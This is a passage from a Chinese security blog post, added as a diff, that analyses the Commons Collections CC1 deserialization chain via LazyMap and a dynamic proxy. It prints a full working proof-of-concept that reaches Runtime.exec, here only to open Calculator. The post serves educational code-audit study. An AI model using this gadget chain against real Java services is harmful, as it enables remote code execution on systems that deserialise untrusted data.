+</span></span><span class="line"><span class="cl">    <span class="o">}</span>
+</span></span></code></pre></div><p>那么又如何能调用到 AnnotationInvocationHandler#invoke 呢?ysoserial的作者想到的是利用Java 的对象代理。</p>
+<p>如果对动态代理有不熟悉可以看下b站的视频<a href="https://www.bilibili.com/video/BV1M54y1X78p/?spm_id_from=333.337.search-card.all.click&amp;vd_source=ba06a90e1fa2cd97f3dca910bb39ce20">两个小时带你深入剖析代理模式</a></p>
+<p>由此可知AnnotationInvocationHandler本身就是一个InvocationHandler，所以只要我们在反序列化调用readObject的时候要是使用到了代理就会触发里面的invoke方法，接着就能进入我们的所需的get 方法中。</p>
+<p>下面我们只要把LazyMap替换掉TransformedMap即可，可以看到它的构造方法也是protected属性，不过也提供了decorate方法来给我们创建对象，所以我们只要替换一下名字即可。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"> <span class="kd">protected</span> <span class="nf">LazyMap</span><span class="o">(</span><span class="n">Map</span> <span class="n">map</span><span class="o">,</span> <span class="n">Transformer</span> <span class="n">factory</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">        <span class="kd">super</span><span class="o">(</span><span class="n">map</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="o">(</span><span class="n">factory</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">throw</span> <span class="k">new</span> <span class="n">IllegalArgumentException</span><span class="o">(</span><span class="s">&#34;Factory must not be null&#34;</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="o">}</span>
+</span></span><span class="line"><span class="cl">        <span class="k">this</span><span class="o">.</span><span class="na">factory</span> <span class="o">=</span> <span class="n">factory</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">    <span class="o">}</span>
+</span></span></code></pre></div><p>我们再用反射来写一个代理：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">Class</span> <span class="n">c</span> <span class="o">=</span> <span class="n">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="s">&#34;sun.reflect.annotation.AnnotationInvocationHandler&#34;</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl"><span class="n">Constructor</span> <span class="n">AnnotationInvocationHandlerConstructor</span> <span class="o">=</span><span class="n">c</span><span class="o">.</span><span class="na">getDeclaredConstructor</span><span class="o">(</span><span class="n">Class</span><span class="o">.</span><span class="na">class</span><span class="o">,</span><span class="n">Map</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl"><span class="n">AnnotationInvocationHandlerConstructor</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl"><span class="n">InvocationHandler</span> <span class="n">Lazyhandler</span> <span class="o">=</span> <span class="o">(</span><span class="n">InvocationHandler</span><span class="o">)</span> <span class="n">AnnotationInvocationHandlerConstructor</span><span class="o">.</span><span class="na">newInstance</span><span class="o">(</span><span class="n">SOAPMessageHandlers</span><span class="o">.</span><span class="na">class</span><span class="o">,</span><span class="n">outerMap</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">Map</span> <span class="n">proxyMap</span><span class="o">=(</span><span class="n">Map</span><span class="o">)</span> <span class="n">Proxy</span><span class="o">.</span><span class="na">newProxyInstance</span><span class="o">(</span><span class="n">Map</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">getClassLoader</span><span class="o">(),</span><span class="n">outerMap</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getInterfaces</span><span class="o">(),</span> <span class="n">Lazyhandler</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl"><span class="n">InvocationHandler</span> <span class="n">handler</span> <span class="o">=</span> <span class="o">(</span><span class="n">InvocationHandler</span><span class="o">)</span> <span class="n">AnnotationInvocationHandlerConstructor</span><span class="o">.</span><span class="na">newInstance</span><span class="o">(</span><span class="n">SOAPMessageHandlers</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="n">proxyMap</span><span class="o">);</span>
+</span></span></code></pre></div><p>完整的POC：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">org.apache.commons.collections.Transformer</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">org.apache.commons.collections.functors.ChainedTransformer</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">org.apache.commons.collections.functors.ConstantTransformer</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">org.apache.commons.collections.functors.InvokerTransformer</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">org.apache.commons.collections.map.LazyMap</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">javax.jws.soap.SOAPMessageHandlers</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">java.io.ByteArrayInputStream</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">java.io.ByteArrayOutputStream</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">java.io.ObjectInputStream</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">java.io.ObjectOutputStream</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">java.lang.reflect.Constructor</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">java.lang.reflect.InvocationHandler</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">java.lang.reflect.Proxy</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">java.util.HashMap</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">java.util.Map</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">public</span> <span class="kd">class</span> <span class="nc">CC1_LazyMap</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">Transformer</span><span class="o">[]</span> <span class="n">transformers</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Transformer</span><span class="o">[]{</span>
+</span></span><span class="line"><span class="cl">                <span class="k">new</span> <span class="n">ConstantTransformer</span><span class="o">(</span><span class="n">Runtime</span><span class="o">.</span><span class="na">class</span><span class="o">),</span>
+</span></span><span class="line"><span class="cl">                <span class="k">new</span> <span class="n">InvokerTransformer</span><span class="o">(</span><span class="s">&#34;getMethod&#34;</span><span class="o">,</span> <span class="k">new</span> <span class="n">Class</span><span class="o">[]{</span><span class="n">String</span><span class="o">.</span><span class="na">class</span><span class="o">,</span><span class="n">Class</span><span class="o">[].</span><span class="na">class</span><span class="o">},</span> <span class="k">new</span> <span class="n">Object</span><span class="o">[]{</span><span class="s">&#34;getRuntime&#34;</span><span class="o">,</span><span class="kc">null</span><span class="o">}),</span>
+</span></span><span class="line"><span class="cl">                <span class="k">new</span> <span class="n">InvokerTransformer</span><span class="o">(</span><span class="s">&#34;invoke&#34;</span><span class="o">,</span> <span class="k">new</span> <span class="n">Class</span><span class="o">[]{</span><span class="n">Object</span><span class="o">.</span><span class="na">class</span><span class="o">,</span><span class="n">Object</span><span class="o">[].</span><span class="na">class</span><span class="o">},</span> <span class="k">new</span> <span class="n">Object</span><span class="o">[]{</span><span class="kc">null</span><span class="o">,</span><span class="kc">null</span><span class="o">}),</span>
+</span></span><span class="line"><span class="cl">                <span class="k">new</span> <span class="n">InvokerTransformer</span><span class="o">(</span><span class="s">&#34;exec&#34;</span><span class="o">,</span> <span class="k">new</span> <span class="n">Class</span><span class="o">[]{</span><span class="n">String</span><span class="o">.</span><span class="na">class</span><span class="o">},</span> <span class="k">new</span> <span class="n">Object</span><span class="o">[]</span> <span class="o">{</span><span class="s">&#34;/System/Applications/Calculator.app/Contents/MacOS/Calculator&#34;</span><span class="o">}),</span>
+</span></span><span class="line"><span class="cl">        <span class="o">};</span>
+</span></span><span class="line"><span class="cl">        <span class="n">ChainedTransformer</span> <span class="n">chainedTransformer</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ChainedTransformer</span><span class="o">(</span><span class="n">transformers</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">Map</span> <span class="n">outerMap</span> <span class="o">=</span>  <span class="n">LazyMap</span><span class="o">.</span><span class="na">decorate</span><span class="o">(</span><span class="k">new</span> <span class="n">HashMap</span><span class="o">(),</span> <span class="n">chainedTransformer</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">Class</span> <span class="n">c</span> <span class="o">=</span> <span class="n">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="s">&#34;sun.reflect.annotation.AnnotationInvocationHandler&#34;</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">Constructor</span> <span class="n">AnnotationInvocationHandlerConstructor</span> <span class="o">=</span><span class="n">c</span><span class="o">.</span><span class="na">getDeclaredConstructor</span><span class="o">(</span><span class="n">Class</span><span class="o">.</span><span class="na">class</span><span class="o">,</span><span class="n">Map</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">AnnotationInvocationHandlerConstructor</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">InvocationHandler</span> <span class="n">Lazyhandler</span> <span class="o">=</span> <span class="o">(</span><span class="n">InvocationHandler</span><span class="o">)</span> <span class="n">AnnotationInvocationHandlerConstructor</span><span class="o">.</span><span class="na">newInstance</span><span class="o">(</span><span class="n">SOAPMessageHandlers</span><span class="o">.</span><span class="na">class</span><span class="o">,</span><span class="n">outerMap</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">Map</span> <span class="n">proxyMap</span><span class="o">=(</span><span class="n">Map</span><span class="o">)</span> <span class="n">Proxy</span><span class="o">.</span><span class="na">newProxyInstance</span><span class="o">(</span><span class="n">Map</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">getClassLoader</span><span class="o">(),</span><span class="n">outerMap</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getInterfaces</span><span class="o">(),</span> <span class="n">Lazyhandler</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">InvocationHandler</span> <span class="n">handler</span> <span class="o">=</span> <span class="o">(</span><span class="n">InvocationHandler</span><span class="o">)</span> <span class="n">AnnotationInvocationHandlerConstructor</span><span class="o">.</span><span class="na">newInstance</span><span class="o">(</span><span class="n">SOAPMessageHandlers</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="n">proxyMap</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">ByteArrayOutputStream</span> <span class="n">barr</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ByteArrayOutputStream</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl">        <span class="n">ObjectOutputStream</span> <span class="n">oss</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ObjectOutputStream</span><span class="o">(</span><span class="n">barr</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">oss</span><span class="o">.</span><span class="na">writeObject</span><span class="o">(</span><span class="n">handler</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">oss</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">ObjectInputStream</span> <span class="n">ois</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ObjectInputStream</span><span class="o">(</span><span class="k">new</span> <span class="n">ByteArrayInputStream</span><span class="o">(</span><span class="n">barr</span><span class="o">.</span><span class="na">toByteArray</span><span class="o">()));</span>
+</span></span><span class="line"><span class="cl">        <span class="n">ois</span><span class="o">.</span><span class="na">readObject</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="o">}</span>
+</span></span><span class="line"><span class="cl"><span class="o">}</span>
+</span></span></code></pre></div><h2 id="0x04-总结">0x04 总结</h2>
+<p>其实还有JDK版本的问题，因为高版本的修复了AnnotationInvocationHandler的readObject，但是在CC6的还是可以利用的，在后续也会出相关的文章。</p>
+<p>这里面有很多基础的知识需要掌握，要不然会看得很累，所以大家还是要继续加油！</p>
+<p>笔者也是照葫芦画瓢，有写得不好的的请见谅，感谢！</p>
+<h2 id="0x05-参考">0x05 参考</h2>
+<p><a href="https://github.com/phith0n/JavaThings">https://github.com/phith0n/JavaThings</a></p>
+
+
+            <hr class="bg-gray-300 mt-8">
+
+            
+
+            
+<div class="border-l-4 border-red-400 mx-auto text-gray-500">
+    <div class="copyright">
+        <ul class="list-none">
+            <li>
+                <strong>原文作者：</strong>
+                <a rel="author" href="https://xxe.icu">F0rmat</a>
+            </li>
+            <li style="word-break:break-all">
+                <strong>原文链接：</strong>
+                <a href="https://xxe.icu/commonscollections1_chain_analysis.html">https://xxe.icu/commonscollections1_chain_analysis.html</a>
+            </li>
+            <li>
+                <strong>版权声明：</strong>本作品采用
+                <a rel="license" href="https://creativecommons.org/licenses/by-nc/4.0/deed.zh">署名 - 非商业性使用 4.0 国际 (CC BY-NC 4.0)</a>进行许可，非商业转载请注明出处（作者，原文链接），商业转载请联系作者获得授权。
+            </li>
+        </ul>
+    </div>
+ 
+</div>
+
+
+        </div>
+
+        
+        
+
+         
+        
+            <p class="text-gray-500 text-sm text-right pt-1">
+                <span id="busuanzi_container_page_pv">
+                    本文有 <span id="busuanzi_value_page_pv"></span> 次阅读
+                </span>
+            </p>
+        
+
+    </div>
+    
+
+    
+    <hr class="bg-gray-300 dark:bg-gray-300 my-10">
+
+    
+        
+        
+        <div class="comments">
+            <div id="disqus_thread"></div>
+    <script type="text/javascript">
+    (function() {
+      
+      
+      if (window.location.hostname === 'localhost') return;
+      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+      var disqus_shortname = 'forecho-blog';
+      dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+    </script>
+    <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+
+  
+
+  
+    <script src="https://utteranc.es/client.js"
+            repo="Secd0g/comment"
+            issue-term="pathname"
+            theme="github-light"
+            crossorigin="anonymous"
+            async>
+    </script>
+    <noscript>Please enable JavaScript to view the <a href="https://github.com/utterance">comments powered by utterances.</a></noscript>
+
+  
+        </div>
+
+        <div class="related my-5">
+            
+
+
+<div class="p-8 mt-6 lg:mt-0 rounded shadow bg-white dark:bg-gray-800">
+    <h2 class="font-sans font-bold break-normal text-gray-700 px-2 pb-3 text-xl dark:text-gray-300">相关文章</h2>
+    
+    <li><a href="/install-parallels-tools-on-kali-linux-2022.2.html" class="underline text-yellow-600">Kali Linux 2022.2安装Parallels Tools</a></li>
+    
+    <li><a href="/urldns_chain_analysis.html" class="underline text-yellow-600">Java代码审计-URLDNS链分析</a></li>
+    
+    <li><a href="/python_separation_to_antivirus.html" class="underline text-yellow-600">免杀技术- Python分离免杀</a></li>
+    
+    <li><a href="/sdl.html" class="underline text-yellow-600">SDL(安全开发生命周期)</a></li>
+    
+    <li><a href="/using_bloodhound_under_macos.html" class="underline text-yellow-600">域渗透-MacOS下的BloodHound攻击</a></li>
+    
+</div>
+
+        </div>
+
+    
+
+</section>
+
+
+<div class="hidden xl:text-sm xl:block xl:w-1/4 xl:px-6 ">
+
+    <div class="lg:w-full mx-auto items-center justify-between">
+    <div class="bg-white shadow rounded overflow-hidden dark:bg-gray-800">
+        <div class="bg-cover mx-auto w-32 h-32 mt-5 rounded-full" style="background-image: url('https://avatars.githubusercontent.com/u/16066632?v=4')"> </div>
+        
+        <div class="p-4">
+            <p class="text-2xl text-center pb-2">F0rmat</p>
+            <p class="text-sm text-center text-gray-700 dark:text-gray-300">专注于信息安全、内网渗透、红队攻防</p>
+        </div>
+        <div class="flex p-4 border-t text-sm border-gray-300 text-gray-700 dark:text-gray-300">
+            <div class="flex-1 border-r border-gray-600">
+                <p class="text-center">
+                    <span class="font-bold ">
+                        85
+                    </span>
+                    文章
+                </p>
+            </div>
+            <div class="flex-1 text-center">
+                <p class="text-center">
+                    <span class="font-bold">
+                        
+                            60
+                        
+                    </span>
+                    标签
+                </p>
+            </div>
+        </div>
+        <div class="px-4 pb-4 border-t border-gray-300 dark:text-gray-200">
+            <div class="mt-6 pb-16 lg:pb-0 w-4/5 lg:w-full mx-auto flex flex-wrap items-center  text-gray-500">
+                
+                <a href="//github.com/Secd0g" class="hover:text-gray-900 dark:hover:text-gray-100 p-1 text-2xl" target="_blank" title="GitHub"><i class="my-iconfont icon-social-github"></i></a>
+                
+
+                
+
+                
+
+                
+
+                
+
+                
+
+                
+
+                
+
+                
+
+                
+
+                
+
+                
+
+                
+
+                
+
+                
+
+                
+
+                
+                
+                <a href="//zhihu.com/people/F0rmat" class="hover:text-gray-900 dark:hover:text-gray-100 p-1 text-2xl" target="_blank" title="zhihu"><i><svg xmlns="http://www.w3.org/2000/svg" height="1em" viewBox="0 0 640 512"><style>svg{fill:#bac5d8}</style><path d="M170.54 148.13v217.54l23.43.01 7.71 26.37 42.01-26.37h49.53V148.13H170.54zm97.75 193.93h-27.94l-27.9 17.51-5.08-17.47-11.9-.04V171.75h72.82v170.31zm-118.46-94.39H97.5c1.74-27.1 2.2-51.59 2.2-73.46h51.16s1.97-22.56-8.58-22.31h-88.5c3.49-13.12 7.87-26.66 13.12-40.67 0 0-24.07 0-32.27 21.57-3.39 8.9-13.21 43.14-30.7 78.12 5.89-.64 25.37-1.18 36.84-22.21 2.11-5.89 2.51-6.66 5.14-14.53h28.87c0 10.5-1.2 66.88-1.68 73.44H20.83c-11.74 0-15.56 23.62-15.56 23.62h65.58C66.45 321.1 42.83 363.12 0 396.34c20.49 5.85 40.91-.93 51-9.9 0 0 22.98-20.9 35.59-69.25l53.96 64.94s7.91-26.89-1.24-39.99c-7.58-8.92-28.06-33.06-36.79-41.81L87.9 311.95c4.36-13.98 6.99-27.55 7.87-40.67h61.65s-.09-23.62-7.59-23.62v.01zm412.02-1.6c20.83-25.64 44.98-58.57 44.98-58.57s-18.65-14.8-27.38-4.06c-6 8.15-36.83 48.2-36.83 48.2l19.23 14.43zm-150.09-59.09c-9.01-8.25-25.91 2.13-25.91 2.13s39.52 55.04 41.12 57.45l19.46-13.73s-25.67-37.61-34.66-45.86h-.01zM640 258.35c-19.78 0-130.91.93-131.06.93v-101c4.81 0 12.42-.4 22.85-1.2 40.88-2.41 70.13-4 87.77-4.81 0 0 12.22-27.19-.59-33.44-3.07-1.18-23.17 4.58-23.17 4.58s-165.22 16.49-232.36 18.05c1.6 8.82 7.62 17.08 15.78 19.55 13.31 3.48 22.69 1.7 49.15.89 24.83-1.6 43.68-2.43 56.51-2.43v99.81H351.41s2.82 22.31 25.51 22.85h107.94v70.92c0 13.97-11.19 21.99-24.48 21.12-14.08.11-26.08-1.15-41.69-1.81 1.99 3.97 6.33 14.39 19.31 21.84 9.88 4.81 16.17 6.57 26.02 6.57 29.56 0 45.67-17.28 44.89-45.31v-73.32h122.36c9.68 0 8.7-23.78 8.7-23.78l.03-.01z"/></svg></i></a>
+                
+
+                
+
+                
+
+                
+
+                
+
+                
+
+                
+                <a href="/atom.xml" class="hover:text-gray-900 dark:hover:text-gray-100 p-1 text-2xl" target="_blank" title="RSS"><i class="my-iconfont icon-feed"></i></a>
+                
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+
+
+
+
+
+
+    <div class="flex flex-col justify-between sticky top-0 pt-12 pb-4 -mt-10 text-gray-600 dark:text-gray-400">
+        <div class="bg-white shadow rounded p-4 mt-5 dark:bg-gray-800">
+            
+<p class="text-base font-bold py-2 yg:pb-6 text-gray-700 dark:text-gray-300">文章目录</p>
+    <div class="sticky text-sm" style="top:6em;" id="menu-content">
+        <nav id="TableOfContents">
+  <ul>
+        <li><a href="#0x00-前言">0x00 前言</a>
+          <ul>
+            <li><a href="#环境准备">环境准备</a></li>
+          </ul>
+        </li>
+        <li><a href="#0x01-基础">0x01 基础</a>
+          <ul>
+            <li><a href="#反射机制">反射机制</a></li>
+            <li><a href="#java-runtime类">Java Runtime类</a></li>
+            <li><a href="#java-反序列化">Java 反序列化</a></li>
+            <li><a href="#java-注解">Java 注解</a></li>
+            <li><a href="#java-代理">Java 代理</a></li>
+            <li><a href="#疑问解答点">疑问解答点</a></li>
+          </ul>
+        </li>
+        <li><a href="#0x02-transformedmap链分析">0x02 TransformedMap链分析</a></li>
+        <li><a href="#0x03-lazymap链分析">0x03 LazyMap链分析</a></li>
+        <li><a href="#0x04-总结">0x04 总结</a></li>
+        <li><a href="#0x05-参考">0x05 参考</a></li>
+      </ul>
+</nav>
+    </div>
+
+        </div>
+    </div>
+   
+</div> 
+
+    </div>
+    
+    
+<footer class="bg-white dark:bg-gray-800 border-gray-400 shadow mt-10">	
+    <div class="container  mx-auto flex py-8">
+        <div class="w-full text-center text-gray-600 dark:text-gray-400">
+            <p>
+                &copy; 2023 <a  class="text-gray-700 dark:text-gray-300 font-semibold" href="https://xxe.icu">F0rmat&#39;s Blog</a> By F0rmat 
+            </p>
+            
+            <p class="pt-1">
+                Powered by <a rel="nofollow noreferer noopener" href="https://gohugo.io/"  class="text-gray-700 dark:text-gray-300 font-semibold" target="_blank">Hugo</a> 
+                Theme based on <a href="https://github.com/forecho/hugo-theme-echo" class="text-gray-700 dark:text-gray-300 font-semibold" target="_blank">Echo</a>
+            </p>
+
+            <span id="busuanzi_container">
+              访客数：<span id="busuanzi_value_site_uv"></span> | 访问量 <span id="busuanzi_value_site_pv"></span>
+            </span>
+
+        </div>
+
+    </div>
+    
+   
+    
+<script src="/js/clipboard.min.js"></script>
+   
+
+</footer>
+
+ <script>
+  window.onload = function() {
+    document.getElementById("nav-toggle").onclick = function() {
+      document.getElementById("nav-content").classList.toggle("hidden");
+    };
+
+    var donate = document.getElementById("btn-donate");
+    if (donate) {
+      donate.onclick = function() {
+        document.getElementById("donate-image").classList.remove("hidden");
+        donate.classList.add("hidden");
+      };
+    }
+
+    var hostname = window.location.hostname;
+    var divs = document.querySelectorAll('a[href^="http"]');
+    [].forEach.call(divs, function(div) {
+      url = div.getAttribute("href");
+      var domain = url
+        .replace("http://", "")
+        .replace("https://", "")
+        .split(/[/?#:]/)[0];
+      if (domain !== hostname) {
+        div.setAttribute("target", "_blank");
+      }
+    });
+  };
+
+   
+  
+  var h = document.documentElement,
+    b = document.body,
+    st = "scrollTop",
+    sh = "scrollHeight",
+    progress = document.querySelector("#progress"),
+    scroll;
+  var scrollpos = window.scrollY;
+  var header = document.getElementById("header");
+  var navcontent = document.getElementById("nav-content");
+
+  document.addEventListener("scroll", function() {
+     
+    scroll = ((h[st] || b[st]) / ((h[sh] || b[sh]) - h.clientHeight)) * 100;
+    progress.style.setProperty("--scroll", scroll + "%");
+
+     
+    scrollpos = window.scrollY;
+
+    if (scrollpos > 10) {
+      navcontent.classList.remove("bg-gray-100");
+    } else {
+      navcontent.classList.add("bg-gray-100");
+    }
+  });
+
+  
+  if (localStorage.theme === 'dark' || (!'theme' in localStorage && window.matchMedia('(prefers-color-scheme: dark)').matches)) {
+      var lightIcon = document.getElementById("light-icon");
+      var darkIcon = document.getElementById("dark-icon"); 
+      lightIcon.classList.add("hidden");
+      darkIcon.classList.remove("hidden");
+      document.querySelector('html').classList.add('dark')
+  }
+
+  document.getElementById('switchTheme').addEventListener('click', function() {
+    let htmlClasses = document.querySelector('html').classList;
+    var lightIcon = document.getElementById("light-icon");
+    var darkIcon = document.getElementById("dark-icon");
+    if(localStorage.theme == 'dark') {
+        htmlClasses.remove('dark');
+        localStorage.removeItem('theme');
+        darkIcon.classList.add("hidden");
+        lightIcon.classList.remove("hidden");
+    } else {
+        htmlClasses.add('dark');
+        lightIcon.classList.add("hidden");
+        darkIcon.classList.remove("hidden");
+        localStorage.theme = 'dark';
+    }
+  });
+</script>
+
+</body>
+
+</html>
